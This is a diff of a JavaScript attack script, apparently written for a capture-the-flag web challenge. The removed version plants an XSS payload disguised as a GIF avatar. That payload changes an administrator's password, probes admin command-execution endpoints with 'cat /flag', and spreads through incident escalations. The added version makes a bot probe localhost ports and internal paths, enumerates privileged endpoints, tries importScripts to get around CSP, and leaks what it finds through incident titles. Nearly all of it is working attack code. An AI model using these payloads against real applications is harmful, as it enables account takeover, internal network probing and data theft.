@@ -1,4 +1,4 @@
-// Stage 1: dev bot uploads avatar that changes admin password, then escalates
+// Probe: try localhost/internal services + re-examine admin audit
 (async () => {
   var O = self.location.origin;
   var P = function(t) {
@@ -9,83 +9,85 @@
     }).catch(function() {});
   };
 
-  await P('S2|START');
+  await P('P5|START|' + O);
 
-  // Admin XSS payload: change admin password + explore admin endpoints
-  var adminJS = [
-    'GIF89a=1;(async()=>{',
-    "var O=self.location.origin;",
-    "var P=function(t){return fetch(O+'/api/incidents',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:String(t).slice(0,105),facility:'Meridian-2',severity:'Watch'})}).catch(function(){})};",
-    // Change admin password
-    "var cp=await fetch(O+'/api/profile/password',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:'Pwned2025!'})});",
-    "await P('ADMIN|PWCHANGE|'+cp.status+'|'+(await cp.text()).slice(0,60));",
-    // Try alternate password change format
-    "var cp2=await fetch(O+'/api/profile/password',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({newPassword:'Pwned2025!',new_password:'Pwned2025!'})});",
-    "await P('ADMIN|PWCHANGE2|'+cp2.status+'|'+(await cp2.text()).slice(0,60));",
-    // PUT variant
-    "var cp3=await fetch(O+'/api/profile/password',{method:'PUT',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:'Pwned2025!'})});",
-    "await P('ADMIN|PWCHANGE3|'+cp3.status+'|'+(await cp3.text()).slice(0,60));",
-    // Read /api/me to check identity and flag
-    "var me=await(await fetch(O+'/api/me',{credentials:'same-origin'})).json();",
-    "var u=me.user||{};await P('ADMIN|ME|'+u.id+'|'+u.role+'|'+u.email);",
-    "await P('ADMIN|FLAG|'+(u.flag||'none').slice(0,90));",
-    // Try admin-specific endpoints
-    "var eps=['/api/admin/flag','/api/admin/exec','/api/admin/shell','/api/admin/command','/api/admin/system','/api/flag','/api/pwned'];",
-    "for(var i=0;i<eps.length;i++){try{var r=await fetch(O+eps[i],{credentials:'same-origin'});await P('ADMIN|EP|'+eps[i]+'|'+r.status+'|'+(await r.text()).slice(0,40))}catch(e){}}",
-    // Try POST with command
-    "var eps2=['/api/admin/exec','/api/admin/command','/api/developer/exec'];",
-    "for(var i=0;i<eps2.length;i++){try{var r=await fetch(O+eps2[i],{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:'cat /flag',command:'cat /flag'})});await P('ADMIN|CMD|'+eps2[i]+'|'+r.status+'|'+(await r.text()).slice(0,40))}catch(e){}}",
-    "await P('ADMIN|DONE')})()"
-  ].join('');
-
-  // Upload as avatar
-  var b64 = btoa(adminJS);
-  var avatarUri = 'data:image/gif;base64,' + b64;
-
-  await P('S2|UPLOADING');
-  var upRes = await fetch(O + '/api/profile', {
-    method: 'POST', credentials: 'same-origin',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ name: 'Dev Bot', organization: 'AegisCore', avatar: avatarUri })
-  });
-  await P('S2|UPLOAD|' + upRes.status);
-
-  var meRes = await (await fetch(O + '/api/me', { credentials: 'same-origin' })).json();
-  var avatarPath = (meRes.user || {}).avatar || '';
-  await P('S2|AVATAR|' + avatarPath);
-
-  var xss = '<script src=' + avatarPath + '></script>';
-
-  // Escalate seed incidents 1,2,3 (these should work on fresh instance)
-  for (var incId = 1; incId <= 3; incId++) {
+  // 1. Try localhost ports for internal services
+  var ports = [3000, 8080, 80, 5000, 8000, 4000, 9000, 1337, 3001];
+  for (var i = 0; i < ports.length; i++) {
     try {
-      var escRes = await fetch(O + '/api/incidents/' + incId + '/escalate', {
-        method: 'POST', credentials: 'same-origin',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ details: xss })
-      });
-      await P('S2|ESC|' + incId + '|' + escRes.status);
-    } catch(e) { await P('S2|ESCERR|' + incId); }
+      var r = await fetch('http://localhost:' + ports[i] + '/flag', {mode: 'no-cors'});
+      await P('P5|PORT|' + ports[i] + '|' + r.status + '|' + r.type);
+    } catch(e) {
+      // no-cors doesn't give us content. Try cors mode
+      try {
+        var r2 = await fetch('http://localhost:' + ports[i] + '/flag');
+        var t = await r2.text();
+        await P('P5|PORTC|' + ports[i] + '|' + r2.status + '|' + t.slice(0, 60));
+      } catch(e2) {
+        await P('P5|PORTF|' + ports[i] + '|' + String(e2).slice(0, 60));
+      }
+    }
   }
 
-  // Also escalate some new incidents
-  for (var i = 0; i < 2; i++) {
-    await fetch(O + '/api/incidents', {
-      method: 'POST', credentials: 'same-origin',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ title: 'S2 diag ' + i, facility: 'Meridian-2', severity: 'Critical' })
-    });
-  }
-  var list = await (await fetch(O + '/api/incidents', { credentials: 'same-origin' })).json();
-  var myIncs = (list.incidents || []).filter(function(x) { return (x.title || '').indexOf('S2 diag') === 0; });
-  for (var j = 0; j < myIncs.length; j++) {
-    var esc = await fetch(O + '/api/incidents/' + myIncs[j].id + '/escalate', {
-      method: 'POST', credentials: 'same-origin',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ details: xss })
-    });
-    await P('S2|ESC2|' + myIncs[j].id + '|' + esc.status);
+  // 2. Try localhost with various flag paths
+  var paths = ['/flag', '/flag.txt', '/api/flag', '/cat', '/api/cat', '/', '/etc/flag'];
+  for (var j = 0; j < paths.length; j++) {
+    try {
+      var r = await fetch('http://localhost:3000' + paths[j]);
+      var t = await r.text();
+      await P('P5|LOCAL|' + paths[j] + '|' + r.status + '|' + t.slice(0, 60));
+    } catch(e) {}
   }
 
-  await P('S2|DONE');
+  // 3. Check what this bot can access that we can't
+  var eps = [
+    '/api/admin/audit', '/api/admin/audit?log=2', '/api/admin/users',
+    '/api/escalations', '/api/reports',
+    '/api/developer/diagnostics', '/api/developer/tools',
+    '/api/developer/audit', '/api/developer/system',
+    '/api/developer/exec', '/api/developer/shell',
+    '/api/developer/cat', '/api/developer/flag',
+    '/api/system/flag', '/api/cat', '/flag',
+  ];
+  for (var k = 0; k < eps.length; k++) {
+    try {
+      var r = await fetch(O + eps[k], {credentials: 'same-origin'});
+      var t = await r.text();
+      if (r.status === 200) {
+        await P('P5|EP|' + eps[k] + '|' + r.status + '|' + t.slice(0, 55));
+      } else if (r.status !== 404 && r.status !== 403) {
+        await P('P5|EP|' + eps[k] + '|' + r.status);
+      }
+    } catch(e) {}
+  }
+
+  // 4. Try importScripts from localhost (bypasses CSP?)
+  try {
+    importScripts('http://localhost:3000/flag');
+    await P('P5|IMPORT|localhost:3000/flag|ok');
+  } catch(e) {
+    await P('P5|IMPORT|localhost:3000/flag|' + String(e).slice(0, 60));
+  }
+
+  // 5. Re-read audit entry 2 via developer (even though it failed before as 403)
+  // Try without /api prefix
+  try {
+    var r = await fetch(O + '/admin/audit?log=2', {credentials: 'same-origin'});
+    await P('P5|AUDIT2|' + r.status + '|' + (await r.text()).slice(0, 60));
+  } catch(e) {}
+
+  // 6. Check /api/me for developer flag (full, not truncated)
+  try {
+    var r = await fetch(O + '/api/me', {credentials: 'same-origin'});
+    var j = await r.json();
+    var u = j.user || {};
+    await P('P5|ME|' + u.id + '|' + u.role + '|' + u.email);
+    var f = u.flag || 'none';
+    // Split flag into chunks to avoid truncation
+    for (var c = 0; c < f.length; c += 80) {
+      await P('P5|FL|' + Math.floor(c/80) + '|' + f.slice(c, c+80));
+    }
+  } catch(e) {}
+
+  await P('P5|DONE');
 })();
